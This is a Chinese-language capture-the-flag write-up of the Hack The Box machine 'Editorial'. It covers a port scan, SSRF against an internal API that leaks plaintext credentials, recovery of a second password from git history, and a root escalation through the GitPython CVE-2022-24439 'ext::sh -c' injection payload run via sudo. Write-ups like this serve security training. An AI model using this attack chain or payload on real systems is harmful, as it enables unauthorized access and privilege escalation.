---
layout: post
title: HTB——Editorial
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Editorial/01.png?raw=true)

# 0x01 信息收集

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.6  Expired: 2026.01.01
[06:20:16] [INFO] Start IpScan:10.129.139.118
[06:20:16] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

端口扫描   0% [░░░░░░░░░░░░░░░░░░░░] (4/65535) [0s:2h38m59s][06:20:17] [+] 10.129.139.118:22 open
端口扫描   0% [░░░░░░░░░░░░░░░░░░░░] (56/65535) [0s:12m46s][06:20:17] [+] 10.129.139.118:80 open
[06:20:17] [+] [TCP/SSH]  [OpenSSH 8.9p1 Ubuntu 3ubuntu0.7] 10.129.139.118:22 [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.7]                                                                           
端口扫描   2% [░░░░░░░░░░░░░░░░░░░░] (1640/65535) [1s:24s][06:20:17] [INFO] start SSH check 10.129.139.118:22
[06:20:17] [+] 开始 SshScan 任务: SSH://10.129.139.118:22
[06:20:18] [+] [TCP/HTTP] [200] [nginx/1.18.0 (Ubuntu)] http://10.129.139.118:80 [Editorial Tiempo Arriba]                                                                                        
                                                             
[06:20:29] [+] alive ports is: 2
[06:20:29] [+] Ip扫描结束:10.129.139.118
[06:20:29] [INFO] Start UrlScan:http://10.129.139.118:80
[06:20:33] [+] [TCP/HTTP] [200] [nginx/1.18.0 (Ubuntu)] http://10.129.139.118:80 [Editorial Tiempo Arriba]                                                                                        
                                                 
[06:20:33] [+] Url扫描结束:http://10.129.139.118:80
[06:20:33] [+] 项目任务完成:Default, Timeuse：16.611471451
[06:20:33] [+] 扫描结束,耗时: 18.727992737s
```

我们首先访问web服务。有一个upload功能可以让我们上传文件，或者通过键入url来让服务器解析url。这里就涉及到SSRF的问题了。写python脚本或者BP的intruder功能都可以用来fuzz，通过探测我们发现输入到本机5000端口时会返回一个与其他端口回显不同的信息。我们访问并查看此信息。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Editorial/02.png?raw=true)

```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

---

# 0x02 SSRF获得账密

得到此内部api后，我们尝试构造SSRF恶意数据，通过访问其内部服务来尝试获取敏感信息。在访问到`/api/latest/metadata/messages/authors`路由时，我们可以获得一个实例账号密码

```json
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```

尝试使用此示例账密SSH登录，我们如愿以偿的获得了`user.txt`

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Editorial/03.png?raw=true)

---

# 0x03 .git历史记录获取敏感信息

接下来在`dev`的home目录下我们可以找到一个`.git`文件。虽然源文件被删除但我们可以通过git记录来尝试查找有效信息。通过`git log`与`git show ***`，我们可以将老的`prod`账密翻出来留存备用。

```bash
dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
```

得知prod账密为`prod:080217_Producti0n_2023!@`。查看`passwd`文件我们可以发现`prod`账户仍留存于机器上未删除。我们切换到prod账户，并查看此账户是否具有特权。

```bash
dev@editorial:~/apps$ su prod
Password: 
prod@editorial:/home/dev/apps$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

查看此脚本内容

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

此代码调用了`gitpython`库来进行`git`仓库的clone行为，我们使用pip查看此`gitpython`库的版本号。`pip3 list`查看到`Gitpython`的版本号为3.1.29.查询到此版本gitpython有一个CVE编号`CVE-2022-24439`.我们查询漏洞详情并尝试复现。这里我们要在本地创建`sh`文件并在此python脚本中调用执行。直接在语句中RCE或反弹shell其不会成功。

```bash
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/evil.sh'
```

最后我们就可以获得到shell了

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Editorial/04.png?raw=true)
---